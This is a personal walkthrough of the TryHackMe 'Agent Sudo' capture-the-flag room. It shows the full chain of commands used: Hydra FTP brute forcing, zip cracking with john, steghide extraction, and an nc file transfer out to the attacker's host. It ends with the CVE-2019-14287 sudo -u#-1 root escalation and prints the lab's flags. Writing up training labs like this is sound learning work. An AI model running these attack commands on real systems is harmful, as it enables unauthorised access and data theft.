first lets enumerate : 

this is the nmap result: 

/////////////////

nmap -sC -sV 10.10.219.134             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 20:10 UTC
Nmap scan report for 10.10.219.134
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.47 seconds

/////////////


this is what appears in the browser when  i try to access the webpage http://10.10.219.134/:
/////////////

Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 

/////////

lets try to use burpsuite to change useragent , since burpsuite didnt work well for me 

i used firefox extention called user agent switcher and manager 
and applied a user agent named C 

so the page turned to this : http://10.10.105.49/agent_C_attention.php 

and this is its content : 

/////////////

Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 

///////////

so its name is chris and has a weak password , cool 

now after i Done enumerating the machine , lets brute force 

, since they have ftp lets use the username that they gave us since they said the password was weak :

lets use hydra :

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.105.49 -V

we found the password : 

[21][ftp] host: 10.10.105.49   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-11 21:44:26

//////////////

lets login in ftp 

/////////

 ftp chris@10.10.105.49                                      
Connected to 10.10.105.49.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

//////



i found a bunch of files lets try to get them : 

/////////////

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.


//////////


lets see what the text files says 

/////

cat To_agentJ.txt                    
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

///

so lets try to find something in the photo : 


///////

in the meta data of the second photo we see 

exiftool cutie.png     
ExifTool Version Number         : 13.25
File Name                       : cutie.png
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2025:05:11 21:48:58+00:00
File Access Date/Time           : 2025:05:11 21:50:54+00:00
File Inode Change Date/Time     : 2025:05:11 21:48:58+00:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279


that it says                        Warning : [minor] Trailer data after PNG IEND chunk

This means extra data was appended after the image ends — a classic steganography trick.

lets use dd to extract from that offset

dd if=cutie.png bs=1 skip=34562 of=agent_r.zip

    if=cutie.png: input file

    bs=1: read 1 byte at a time

    skip=34562: skip first 34562 bytes

    of=agent_r.zip: output file

the result ://

Sun 11 May - 22:04  ~/Desktop/work/tryhackme/AgentSudo   master 2☀ 
 @Abad  dd if=cutie.png bs=1 skip=34562 of=agent_r.zip

280+0 records in
280+0 records out
280 bytes copied, 0.000456275 s, 614 kB/s

 Sun 11 May - 22:04  ~/Desktop/work/tryhackme/AgentSudo   master 2☀ 
 @Abad  ls
 agent_r.zip   cute-alien.jpg   cutie.png   readme.txt   To_agentJ.txt

 Sun 11 May - 22:04  ~/Desktop/work/tryhackme/AgentSudo   master 2☀ 
 @Abad  

////

great , now lets unzip it :

//////////
so unzip didnt work 
May - 22:05  ~/Desktop/work/tryhackme/AgentSudo   master 2☀ 
 @Abad  unzip agent_r.zip
Archive:  agent_r.zip
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
///////


lets use 
///////

unar or 7z

unar agent_r.zip   

agent_r.zip: Zip
  To_agentR.txt  (86 B)... This archive requires a password to unpack.
Password (will not be shown): 
Failed! (Missing or wrong password)
Extraction to current directory failed! (1 file failed.)

so the zip file has a password , lets try to crack it first 

//////////////


we will use john but first we will extract the hash like this : zip2john agent_r.zip > hash.txt


then we will crack the hash with john :  john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

the result : 

//////////

 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Warning: detected hash type "ZIP", but the string is also recognized as "ZIP-opencl"
Use the "--format=ZIP-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (agent_r.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2025-05-11 22:17) 1.428g/s 35108p/s 35108c/s 35108C/s chatty..280690
Use the "--show" option to display all of the cracked passwords reliably
Session completed

//////////


so the password is : alien


lets extract it with the credentials :

/////////

7z x agent_r.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: agent_r.zip
--
Path = agent_r.zip
Type = zip
Physical Size = 280

    
Enter password:alien

Everything is Ok

Size:       86
Compressed: 280

/////////

and this is the content of the extracted file : 

//////

cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
/////

so this QXJlYTUx looks like a strange string of charachter lets identify if it is hashed or encoded using this website 

https://hashes.com/en/tools/hash_identifier

so it says QXJlYTUx - Possible algorithms: Base64 Encoded String

lets go then to this website and try to decode it : https://appdevtools.com/base64-encoder-decoder

and here we go the result of the decode is : Area51

since the room tells us to use "steg password"

The message from To_agentR.txt says:

    "We need to send the picture to 'QXJlYTUx' as soon as possible!"

This strongly suggests that QXJlYTUx is the password for extracting hidden data from one of the image files
 (cute-alien.jpg or cutie.png) using steghide

lets do it 

////////


 ✘  Sun 11 May - 23:23  ~/Desktop/work/tryhackme/AgentSudo   master 2☀ 
 @Abad  steghide extract -sf cute-alien.jpg -p "Area51"  
wrote extracted data to "message.txt".

//////////

looks like there is an extracted file , lets see the content inside it : 

//////////


cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris


////////////


ok we got some ssh credentials james:hackerrules!

lets use them to log in 

//////////////
ssh james@10.10.105.49            
james@10.10.105.49's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 11 23:32:57 UTC 2025

  System load:  0.0               Processes:           98
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for eth0: 10.10.105.49
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
///////////

and looks like there is a flag in this directory :

/////////////

james@agent-sudo:~$ ls -la
total 80
drwxr-xr-x 4 james james  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw------- 1 root  root    566 Oct 29  2019 .bash_history
-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
drwx------ 2 james james  4096 Oct 29  2019 .cache
drwx------ 3 james james  4096 Oct 29  2019 .gnupg
-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$ 

///////////



now What is the incident of the photo called?
lets first download the photo on our machine 
from the target ssh machine lets export it : nc -n 10.21.180.29 7777 < Alien_autospy.jpg    

while listening on the other side : nc -lnvp 7777 > Alien_autospy.jpg 

now when we got the photo we will search in google using the photo for the incident , then we will find that the incident is 

called : Roswell alien autopsy





now lets try to escalate our priviliges : 

////////////

james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ 

//////////////

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

This means:

    User james can run /bin/bash as any user except root using sudo.

BUT: this restriction can be bypassed because of a known logic flaw in how sudo handles user specifications.

It’s related to:

    CVE-2019-14287

This vulnerability occurs when sudo is configured to allow a command as any user except root,
 and the attacker specifies UID -1 or 4294967295 (which both map to root due to how Linux handles unsigned integers). 
This tricks sudo into executing as root anyway.



from ur current shell just run:

sudo -u#-1 /bin/bash

Or:

sudo -u#4294967295 /bin/bash


//////////////////

james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# ls
Alien_autospy.jpg  user_flag.txt
root@agent-sudo:~# whoami
root

///////////////

here lies the flag : 

//////////////////

root@agent-sudo:/# cd root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root# 

greaat rooom hh

/////







